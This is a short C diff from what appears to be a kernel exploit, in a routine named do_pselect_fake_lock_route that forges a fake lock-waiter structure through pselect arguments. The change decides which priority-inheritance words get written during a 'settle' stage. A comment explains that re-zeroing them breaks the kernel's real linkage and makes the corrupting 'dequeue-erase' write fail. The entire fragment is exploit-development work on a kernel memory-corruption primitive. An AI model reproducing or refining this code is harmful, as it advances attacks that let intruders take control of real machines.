@@ -2012,9 +2012,14 @@ void do_pselect_fake_lock_route(void) {
       pselect_put_waiter_word(&in, &out, &ex, wps, 0, w0, "r0");
       pselect_put_waiter_word(&in, &out, &ex, wps, 1, w1, "r1");
       pselect_put_waiter_word(&in, &out, &ex, wps, 2, w2, "r2");
-      pselect_put_waiter_word(&in, &out, &ex, wps, 3, 0, "r3");
-      pselect_put_waiter_word(&in, &out, &ex, wps, 4, 0, "r4");
-      pselect_put_waiter_word(&in, &out, &ex, wps, 5, 0, "r5");
+      if (g_resurge_stage == 1) { /* settle: zero pi words */
+        pselect_put_waiter_word(&in, &out, &ex, wps, 3, 0, "r3");
+        pselect_put_waiter_word(&in, &out, &ex, wps, 4, 0, "r4");
+        pselect_put_waiter_word(&in, &out, &ex, wps, 5, 0, "r5");
+      }
+      /* WRITE: do NOT touch pi words 3-5 — the settle's re-link wrote
+       * the kernel's real linkage there; re-stamping 0 destroys it and
+       * the dequeue-erase silently no-ops (EZP2: 11 writes, 0 landed). */
       pselect_put_waiter_word(&in, &out, &ex, wps, 6, dead_task, "rtask");
       pselect_put_waiter_word(&in, &out, &ex, wps, 7, wlock, "rlock");
       pselect_put_waiter_word(&in, &out, &ex, wps, 8, 0, "rprio");
